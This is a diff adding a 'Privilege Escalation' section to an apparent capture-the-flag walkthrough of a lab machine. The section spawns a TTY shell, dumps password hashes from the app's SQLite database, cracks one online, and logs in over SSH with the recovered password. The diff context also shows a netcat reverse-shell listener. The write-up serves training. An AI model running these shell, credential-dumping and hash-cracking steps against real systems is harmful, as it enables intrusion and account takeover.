@@ -131,11 +131,45 @@ rlwrap nc -lnvp 4444
 
 <img width="371" height="113" alt="image" src="https://github.com/user-attachments/assets/e3d07d4a-136e-4062-9710-bb4c7370d621" />
 
----
+## Privilege Escalation
+After gaining a foothold as `www-data`, I moved quickly to stabilize the shell and hunt for escalation paths.
 
+I spawned a proper TTY to make interactive commands easier:
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+From the web root I navigated the app directory and inspected files and folders:
+```
+cd /var/www/conversor.htb
+ls -la
+# app.py  app.wsgi  instance  __pycache__  scripts  static  templates  uploads
+```
+Inside the instance directory I found the bundled SQLite database and queried the users table:
+```
+cd instance
+sqlite3 ./users.db "SELECT * FROM users;"
+The dump returned multiple user records (id|username|password_hash), including a user fismathack:
+1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
+5|huesos|7d58b345d95b5b021dc16fd5b48a8f8b
+6|getfked|c91b9f8c0be4831296c0cbbb7c511557
+7|lol|8f036369a5cd26454949e594fb9e0a2d
+8|test|098f6bcd4621d373cade4e832627b4f6
+9|admin|21232f297a57a5a743894a0e4a801fc3
+10|shadow|3bf1114a986ba87ed28fc1b5884fc2f8b
+```
+Seeing password hashes, I exported the relevant hash and cracked it using an online cracking resource CrackStation to recover plaintext passwords.
 
-crack station
 <img width="1061" height="382" alt="image" src="https://github.com/user-attachments/assets/ad793427-adfe-4467-93bf-2d427f60ed26" />
 
-user flag 
+The fismathack hash resolved to:
+```
+Keepmesafeandwarm
+```
+With credentials in hand I authenticated over SSH to the box:
+```
+ssh fismathack@10.10.10.10
+# password: Keepmesafeandwarm
+```
+After logging in as fismathack I captured the user flag: 
+
 <img width="259" height="74" alt="image" src="https://github.com/user-attachments/assets/7d7ce33f-1298-46fc-b62f-ffcf96e1f8e6" />
